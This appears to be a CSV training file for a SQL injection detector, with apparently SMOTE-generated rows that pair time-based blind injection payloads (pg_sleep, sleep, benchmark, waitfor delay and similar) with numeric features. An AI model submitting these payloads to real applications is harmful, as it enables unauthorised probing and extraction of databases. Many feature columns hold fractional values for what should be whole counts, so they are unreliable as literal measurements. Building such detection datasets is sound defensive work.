id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_001150,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000049,1.2992217406756,57.85953832039411,19.0,3.243883179700746,23.23969221359607,1.0,25.0,8.619846106798034,0.40148696153532376,0.017294328595522365,0.43235821488805914,0.14886049498109477,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.0,0.0,0.6198461067980349,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.3801538932019652,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.3801538932019652
SMOTE_001151,attack,time,1  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000114,0.34004868138427297,70.796300950571,22.0,3.2795032996324647,19.0,10.0,32.53968652906086,9.256614421510143,0.26885398206314853,0.14150209582270976,0.4589155303275168,0.13072839178662488,0.0,0.0,2.0,0.0,0.0,1.0,0.0,5.256614421510142,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001152,attack,time,1 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   -- fyaq,nearest_attack_euclidean,R000041,0.7428617327244578,66.69745886589503,24.157967092716028,3.557464485499415,21.157967092716028,10.0,27.53949177317901,8.0,0.3165439708971513,0.15014162394498407,0.41320110600187737,0.12011329915598726,0.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,1.0,0.0,3.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001153,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and '%'  =  '",nearest_attack_euclidean,R000118,1.5962010145156522,79.64559160815814,27.415349475509885,3.8598977678972193,24.24604842652965,17.907446328569186,27.076747377549417,10.415349475509883,0.3055430087962178,0.22280432628338903,0.34022822354273574,0.1314244413776574,3.415349475509884,0.0,0.0,0.0,0.0,1.4153494755098834,0.0,4.0,0.5846505244901165,0.0,1.0,1.4153494755098834,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.5846505244901166,0.0,0.0,0.0,1.4153494755098834,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001154,attack,time,waitfor delay '0:0:5' and    (    (     (  'hrta'  =  'hrta,nearest_attack_euclidean,R000084,0.592307929034948,57.76246817352835,20.928148869853736,3.555905617487324,23.0,3.3093829566179114,20.453085216910438,11.0,0.3986019204957929,0.05761669951305756,0.353145678884466,0.19063570110668354,5.309382956617911,0.0,0.0,0.0,0.0,1.0,0.0,2.6906170433820877,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001155,attack,time,select pg_sleep  (  5  )   and    (    (     (  '%'  =  ',nearest_attack_euclidean,R000020,0.8732914675921692,59.48305178244437,18.573011949794854,2.914371181749605,16.95501991632476,1.1910039832649524,30.33702788285466,11.0,0.284387796168271,0.019650169239012,0.509825084619506,0.186136949973211,3.1910039832649515,0.0,0.0,0.0,0.0,1.0,0.0,5.1910039832649515,0.8089960167350483,0.8089960167350484,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8089960167350484,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.19100398326495166,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001156,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  '%'  =  ',nearest_attack_euclidean,R000028,0.7114171722681679,90.99031017199535,22.247577542998837,3.0469001309149477,28.742732628996507,1.247577542998835,45.75242245700117,15.247577542998835,0.31573489973922175,0.013627856820082718,0.5030926422243875,0.16754460121630793,3.2475775429988354,0.0,0.0,0.0,1.0,1.0,0.0,8.752422457001163,1.2475775429988354,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.2475775429988354,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.247577542998836
SMOTE_001157,attack,time,1  )   where 4653  =  4653 or 6793  =    (  select 6793 from pg_sleep  (  5   )    )   --,nearest_attack_euclidean,R000116,0.07961423832280741,88.63315963031856,26.073368073936287,3.5810191976677137,24.0,18.0,36.70652770425485,9.926631926063713,0.2708405790358955,0.2031304342769216,0.414052174873849,0.11197681181333397,0.0,0.0,2.0,0.0,0.0,2.0,0.0,4.926631926063713,0.0,1.0,0.0,4.0,0.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001158,attack,time,"1""  )   where 7165  =  7165 or 8466  =  benchmark  (  5000000,md5  (  0x694a4745   )    )   --",nearest_attack_euclidean,R000015,1.3553143311832716,91.97846662231441,28.0,3.8154724460900056,20.0,29.0,32.38277329785153,10.595693324462882,0.21759869322898778,0.31551810518203227,0.3517466919482852,0.11513650964069477,0.4043066755371175,0.5956933244628825,2.0,0.0,0.0,2.0,0.0,4.595693324462882,0.0,0.0,1.0,4.0,0.4043066755371175,0.5956933244628825,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001159,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.716575583146899,84.01308193229642,24.183007448390583,3.228164052380801,31.83007448390583,1.8169925516094185,39.18300744839058,11.183007448390583,0.37761259503165295,0.021894469625934873,0.46728250923268655,0.13321042610972558,1.3660148967811656,0.0,0.0,0.0,1.0,0.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.8169925516094171,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.18300744839058292,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.183007448390583
SMOTE_001160,attack,time,1%' and   (  select * from   (  select  (  sleep  (  5   )    )     )  fzno  )   and '%'  =  ',nearest_attack_euclidean,R000007,1.8621195683916647,93.19473846059657,22.597369230298284,3.228976967586742,33.01315384850858,1.597369230298284,43.79210769089485,14.792107690894852,0.3545559169150454,0.017086405033168994,0.4697843307374272,0.15857334731435835,3.5973692302982845,0.0,0.0,0.0,1.0,1.0,0.0,8.0,1.1947384605965685,0.0,0.0,2.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,1.5973692302982843,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.597369230298284
SMOTE_001161,attack,time,"select benchmark  (  5000000,md5  (  0x4c4d6142   )    )    and    (    (   6866  =  6866",nearest_attack_euclidean,R000003,0.4736281222929171,86.8805641665713,26.0,3.5858288530769977,21.940282083285656,22.86753526041071,34.07274682287495,8.0,0.25141328760678516,0.2641153859235667,0.39197394511403333,0.09249738135561482,0.13246473958929306,0.0,0.0,0.0,0.0,1.0,0.0,5.8675352604107065,0.0,0.0,1.0,1.0,0.13246473958929322,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.8675352604107068,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.867535260410707
SMOTE_001162,attack,time,"1"" or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  )  ",nearest_attack_euclidean,R000122,0.6460150895337772,79.42966995424204,19.761721674292993,2.965778743388379,27.0,2.0,39.95311330282803,10.476556651414016,0.3402623490896619,0.025204618451086055,0.5028366467346073,0.1316963857246448,0.0,1.0,0.0,0.0,1.0,0.0,0.0,8.238278325707007,0.0,0.0,0.0,1.0,0.0,1.0,0.0,0.23827832570700813,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001163,attack,time,1'||  (  select 'vuku' where 3143  =  3143 waitfor delay '0:0:5'--,nearest_attack_euclidean,R000027,3.6165770550838374,64.59082220706237,28.53027406902079,4.349531272087496,27.0,12.0,14.0,11.590822207062368,0.4182414142398547,0.185885072995491,0.21686591849473952,0.17900759426991475,4.060548138041579,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,4.530274069020789,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.5302740690207893,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001164,attack,time,1'   )    )     )   and sleep  (  5  )   and    (    (     (  'hwjy'  =  'hwjy,nearest_attack_euclidean,R000047,0.7509909844014958,77.70759622608267,18.29240377391732,2.681411595615281,18.707596226082675,2.0,44.0,13.0,0.2407173122442354,0.02573839619511066,0.5662447162924346,0.1672995752682193,4.0,0.0,0.0,0.0,0.0,1.0,0.0,8.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.707596226082676,0.29240377391732386,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001165,attack,time,select pg_sleep  (  5  )   and    (    (   'vxxg'  =  'vxxg,nearest_attack_euclidean,R000049,0.3258705164093381,60.45499798462211,19.290999596924422,3.2450608883146623,24.0,1.0,26.16399838769769,9.290999596924422,0.3975317924706222,0.01656382468627593,0.43228309196467446,0.1536212908784274,3.0,0.0,0.0,0.0,0.0,1.0,0.0,4.290999596924422,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001166,attack,time,1'   )    )    as xkiq where 9008  =  9008 and sleep  (  5  )  --,nearest_attack_euclidean,R000129,1.1666546850609623,64.55470897286214,24.109417945724296,3.4394951717505964,18.554708972862148,10.0,28.0,8.0,0.28738380114222567,0.15491656496908138,0.43376638191342787,0.12393325197526511,1.0,0.0,2.0,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.5547089728621479,0.445291027137852,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001167,attack,time,1'  )   waitfor delay '0:0:5' and   (  'vtfs'  =  'vtfs,nearest_attack_euclidean,R000034,0.8481837374279686,56.77214303288656,21.67089272533508,3.6415441504181874,23.0,3.5569642417783607,19.2151787911082,11.0,0.4056211741890937,0.06303373225462668,0.3373523580745391,0.19399273548174048,5.55696424177836,0.0,0.0,0.0,0.0,1.0,0.0,2.4430357582216398,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001168,attack,time,"1   )    )    and elt  (  1210  =  1210,sleep  (  5   )    )    and    (    (   5874  =  5874",nearest_attack_euclidean,R000096,2.2896550177705977,94.35499792844385,20.9033319522959,2.9132736256229803,17.16166183303565,14.386672190816398,50.0,12.806663904591801,0.18134683909880173,0.1531777050889265,0.5300459345405251,0.13542952127174676,1.8066639045918007,0.0,0.0,0.0,0.0,2.0,0.0,8.0,0.0,0.0,1.0,2.0,0.4516659761479501,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.5483340238520498,0.4516659761479501,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001169,attack,time,"1%""  )   or 4240  =    (  select 4240 from pg_sleep  (  5   )    )   --",nearest_attack_euclidean,R000005,1.4405357837634656,70.14327602789402,23.143276027894025,3.389510590476928,19.0,10.0,31.0,10.143276027894023,0.27092830281078045,0.14259384358462132,0.442040915112326,0.14443693849227218,0.0,0.5716380139470117,2.0,0.0,0.0,1.0,0.0,5.0,0.5716380139470117,1.0,0.0,3.0,0.0,0.5716380139470117,1.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001170,attack,time, (  select * from   (  select  (  sleep  (  5   )    )     )  srmq  )   and   (  9069  =  9069,nearest_attack_euclidean,R000080,0.5060867027897343,94.51862748642823,23.103725497285648,3.1466143696059414,28.414901989142592,9.103725497285648,45.896274502714355,11.103725497285648,0.3005028172533218,0.09629083917547783,0.48575036953357514,0.11745597403762521,0.10372549728564717,0.0,0.0,0.0,1.0,1.0,0.0,8.896274502714352,0.0,0.0,0.0,2.0,0.10372549728564745,0.0,0.0,0.1037254972856472,0.0,1.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.10372549728564731,1.0,0.8962745027143527,0.10372549728564717,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.103725497285647
SMOTE_001171,attack,time,"1'  )   where 4683  =  4683 and 3824  =  benchmark  (  5000000,md5  (  0x76555642   )    )   --",nearest_attack_euclidean,R000090,1.5460341146804513,94.62195724191824,28.0,3.822649001952788,20.0,29.62195724191824,34.0,11.0,0.21137299609872734,0.3130377626791361,0.3593340933678365,0.11625514785430005,0.6219572419182348,0.3780427580817653,2.0,0.0,0.0,2.0,0.0,5.0,0.0,0.0,1.0,4.0,0.6219572419182349,0.3780427580817653,1.0,0.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,1.0,0.0,0.6219572419182348,0.37804275808176524,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001172,attack,time,"1'  )   and 2388  =  benchmark  (  5000000,md5  (  0x6d457153   )    )   #",nearest_attack_euclidean,R000126,0.4366104479132365,73.1694524163709,27.207636895907275,3.7336969203221684,16.0,21.0,27.169452416370895,9.0,0.21878161415792774,0.2871508685822801,0.3710028592959578,0.12306465796383435,1.0,0.0,0.0,0.0,0.0,1.0,0.0,4.792363104092725,0.20763689590727563,0.0,1.0,1.0,1.0,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001173,attack,time,1' rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  vwyq  )  #,nearest_attack_euclidean,R000104,0.7773939883552223,84.86603011405973,23.739451807812753,3.1111825431926916,30.0,2.0,41.60548192187248,11.260548192187247,0.3545789531311576,0.023638596875410506,0.48896857371429503,0.13281387627913682,0.7394518078127518,0.0,0.0,0.0,1.0,0.0,0.0,8.521096384374497,0.0,0.0,0.0,1.0,0.7394518078127517,0.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
SMOTE_001174,attack,time,"1   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000144,1.8106261960727843,73.27443587959743,18.0,2.8158466927336967,12.282330763879232,13.41954870367795,38.0,9.572556412040257,0.16702660576629885,0.18037140006564012,0.5209266990598601,0.13167529510820095,0.0,0.0,0.0,0.0,0.0,1.4274435879597438,0.0,6.572556412040256,0.0,0.0,1.0,1.4274435879597438,0.0,0.0,0.0,0.5725564120402562,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.4274435879597438,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.4274435879597442
SMOTE_001175,attack,time,select sleep  (  5  )   and    (    (     (  'etzb'  =  'etzb,nearest_attack_euclidean,R000135,0.6931475960093486,62.810285959972106,17.603428653324038,3.0211381643594146,22.0,2.357714469979081,29.150857163331008,9.301714326662019,0.351712038823403,0.03458573921148707,0.465686951296654,0.1480152706684559,3.150857163331009,0.0,0.0,0.0,0.0,1.150857163331009,0.0,4.849142836668991,0.0,0.0,0.15085716333100901,1.150857163331009,1.0,0.0,0.0,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.8491428366689908,0.0,0.0,0.0,1.150857163331009,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.0
SMOTE_001176,attack,time,"1'   )    )     )   and elt  (  3114  =  3114,sleep  (  5   )    )   #",nearest_attack_euclidean,R000154,0.3514213130659153,69.84092431360469,18.840924313604685,2.75543647647265,11.0,10.0,38.0,10.840924313604686,0.15750514131477195,0.14318649210433812,0.5441086699964849,0.15519969658440508,0.8409243136046858,0.0,0.0,0.0,0.0,1.0,0.0,7.0,0.0,0.0,1.0,1.0,0.8409243136046858,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001177,attack,time,"1""  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  sddo  )  #",nearest_attack_euclidean,R000103,0.7306628123142637,86.7835263517755,19.642352235025115,2.874772457918698,27.21411741167504,2.0,45.14117411675039,12.428234823350078,0.31441220558207716,0.023126282191513123,0.5192890270840311,0.14317248514237854,0.0,1.0,0.0,0.0,1.0,0.0,0.0,9.428234823350078,0.0,0.0,0.0,1.0,0.0,1.0,0.0,1.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.21411741167503873,0.7858825883249612,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001178,attack,time,"1%'   )    )    or elt  (  5873  =  5873,sleep  (  5   )    )   #",nearest_attack_euclidean,R000023,0.7394274040490805,65.72700475006297,19.636497624968513,2.8942023553825598,10.181751187515744,10.0,34.727004750062974,10.818248812484256,0.15485925968514908,0.1522251845037615,0.5281019280383394,0.16481362777275005,0.8182488124842563,0.0,0.0,0.0,0.0,1.0,0.0,6.181751187515744,0.8182488124842562,0.0,1.0,1.0,0.8182488124842562,0.0,0.0,1.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.1817511875157436,0.8182488124842563,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,2.0
SMOTE_001179,attack,time,1'  )   or   (  select * from   (  select  (  sleep  (  5   )    )     )  ydpu  ) ,nearest_attack_euclidean,R000061,1.445228457779651,80.25886563607922,20.0,2.9551840416884727,27.0,2.0,40.69414922705942,10.564716409019807,0.33661829703343665,0.02493468866914346,0.5068867854758513,0.1315602288215686,0.564716409019807,0.435283590980193,0.0,0.0,1.0,0.0,0.0,8.564716409019807,0.0,0.0,0.0,1.0,0.564716409019807,0.4352835909801931,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,5.0
SMOTE_001180,attack,time,1'+  (  select dpkp where 4836  =  4836 and sleep  (  5   )    )   +',nearest_attack_euclidean,R000036,0.8630926412023798,68.11104622745633,25.0,3.600486894297911,22.111046227456324,10.0,27.22223844313592,8.77776155686408,0.3242158587431418,0.14690959592540398,0.40007496196991255,0.12879958336154174,1.777761556864081,0.0,0.44447688627183823,0.0,0.0,1.0,0.0,4.0,0.0,0.0,0.0,3.0,1.0,0.0,0.22223844313591912,0.0,0.0,1.0,1.0,0.0,0.0,0.0,0.0,0.7777615568640809,0.0,1.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.777761556864081
SMOTE_001181,attack,time,1  )   rlike   (  select * from   (  select  (  sleep  (  5   )    )     )  sgvo  ) ,nearest_attack_euclidean,R000071,0.6571954545212808,81.37064054098404,19.34266013524601,2.9246477047604764,28.904433558743353,1.7808867117486713,40.68532027049203,10.0,0.35496911420385585,0.021635780870522522,0.5,0.12339510492562161,0.0,0.0,0.0,0.0,1.0,0.0,0.0,8.78088671174867,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.2191132882513294,0.0,0.0,1.0,0.0,0.0,0.0,0.0,2.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,4.0
